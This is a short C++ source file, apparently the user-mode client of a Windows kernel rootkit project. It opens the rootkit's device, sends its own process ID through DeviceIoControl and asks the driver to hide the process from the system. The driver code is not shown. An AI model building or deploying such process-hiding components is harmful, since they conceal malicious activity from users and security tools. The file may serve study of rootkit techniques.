#include <Windows.h>
#include <iostream>
#include "../RootKitHideProcess/Header.h"

int main()
{
	HANDLE hDevice;
	UINT32 pid;
	int uselessData;
	DATA_FROM_USER dataBuffer = { 0 };
	DATA_TO_USER dataBufferFromKernel = { 0 };
	hDevice = CreateFileA(
		"\\\\.\\RootKitSym",
		GENERIC_ALL,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED, 
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "error while opening a handle to the file, error code : " << GetLastError() << std::endl;
		return 0;
	}
	
	// now let's get our PID

	pid = GetCurrentProcessId();

	dataBuffer.PID = pid;

	// now let's try to send this to the user..
	std::cout << "our PID is : " << pid << std::endl;
	std::cout << "enter any number to hide the process.\n";
	
	std::cin >> uselessData;

	DeviceIoControl(hDevice, RK_CTL, &dataBuffer, DATA_FROM_USER_SIZE, &dataBufferFromKernel, DATA_TO_USER_SIZE, NULL, NULL);
	
	// now let's see if our process got or not..
	std::cout << "is my process hidden ? " << dataBufferFromKernel.IsProcessHidden << std::endl;

	std::cin >> uselessData;

	return 0;
}